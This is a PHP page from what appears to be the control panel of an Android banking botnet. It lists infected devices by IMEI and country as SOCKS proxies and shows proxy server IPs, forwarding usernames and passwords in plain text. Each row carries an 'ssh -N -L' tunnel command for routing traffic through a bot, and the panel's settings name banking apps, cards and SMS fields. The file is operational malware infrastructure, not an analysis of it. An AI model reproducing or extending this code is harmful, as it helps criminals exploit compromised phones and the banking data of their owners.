
<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php"); 
    return; 
}  
?>
<?php

$html = '';
$html_table = '';
$html_bottom_links = '';

if (isset($_SESSION['bank'])) {
    $conf = $_SESSION['bank'];
  } else {
    $conf = array("imei" => true,
      "android" => true,
      "country" => true,
      "seller" => true,
      "online" => true,
      "lastcon" => true,
      "bankapp" => true,
      "card" => true,
      "sms" => true,
      "firstcon" => false,
      "bank" => true,
      "comment" => true,
      "screen" => false,
      "number" => false,
      "model" => false);
  }

$all_socks_sql = "SELECT `socks`.*,`proxy_servers`.`ip`,`proxy_servers`.`country`,`proxy_servers`.`forward_user`,`proxy_servers`.`forward_pass` FROM `socks` INNER JOIN `proxy_servers` ON `socks`.`server`=`proxy_servers`.`id`";
$all_socks_sql_res = $mysqli->query($all_socks_sql);
//swap horiz
while ($row = mysqli_fetch_assoc($all_socks_sql_res)) {
  $id = $row["id"];
  $imei = $row["IMEI"];
  $country = $row["bot_country"];
  $server = $row["server"];
  $port = $row["port"];
  $connect_time = $row["connect_time"];
  $status = $row["status"];

  $prx_ip = $row["ip"];
  $prx_country = $row["country"];
  $prx_user = $row["forward_user"];
  $prx_pass = $row["forward_pass"];

  if ($row["status"]){
    $status = '<i class="mdl-color-text--green-400 material-icons" role="presentation">swap_horiz</i>';
  } else {
    $status = '<i class="mdl-color-text--red-400 material-icons" role="presentation">swap_horiz</i>';
  };
  if($country == ""){
    $country_img="../admin/images/country/_unknown.png";
  }else{
    $country_img="../admin/images/country/$country.png";
  }
  if($prx_country == ""){
    $prx_country_img="../admin/images/country/_unknown.png";
  }else{
    $prx_country_img="../admin/images/country/$prx_country.png";
  }

  $html_table .= "<tr>";
  $html_table .= "<td>$imei</td><td><center><a title='$country'><img src=$country_img width='16px'/></a></center></td><td>".date(DATE_ATOM,$connect_time)."</td><td>$prx_ip</td><td>$port</td><td><center><a title='$prx_country'><img src=$prx_country_img width='16px'/></a></center></td>";
  $html_table .= "<td>$prx_user</td><td>$prx_pass</td><td>$status</td>";

  $html_table .= '<td><div id="'.$id.'_help" class="mdl-color-text-400 material-icons" style="cursor: pointer;">help</div><div id="'.$id.'_kill" onclick="delete_socks_connection('.$id.');" class="mdl-color-text-400 material-icons" style="cursor: pointer;">delete</div></td>';
  $html_table .= "</tr>";

  $html_bottom_links .= '<div class="mdl-tooltip mdl-tooltip" for="'.$id.'_help">command for connect:<br>ssh -N -L '.$port.':127.0.0.1:'.$port.' '.$prx_user.'@'.$prx_ip.'</div>';
  $html_bottom_links .= '<div class="mdl-tooltip mdl-tooltip" for="'.$id.'_kill">kill connection</div>';
}

//$html_table = getBigTable('bank', $sql, $mysqli);

if ($_SESSION["wide-mode"] == "true"){
    $widemode = "checked";
} else {
    $widemode = "";
}

$html = file_get_contents("templates/socks.tpl");
$html = str_replace('%%PLACE_TOTAL_BANKS_HERE%%', $count, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);
$html = str_replace('%%PLACE_WIDEMODE_HERE%%', $widemode, $html);

//$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_BOTTOM_LINKS_HERE%%', $html_bottom_links, $html);

# set chechboxes
foreach ($conf as $key => $value) {
    if ($value) {
        $check = "checked";
    } else {
        $check = "";
    }
    $placeholder = '%%PLACE_'.$key.'_CHECKBOX_HERE%%';
    $html = str_replace($placeholder, $check, $html);
}

echo $html;

?>
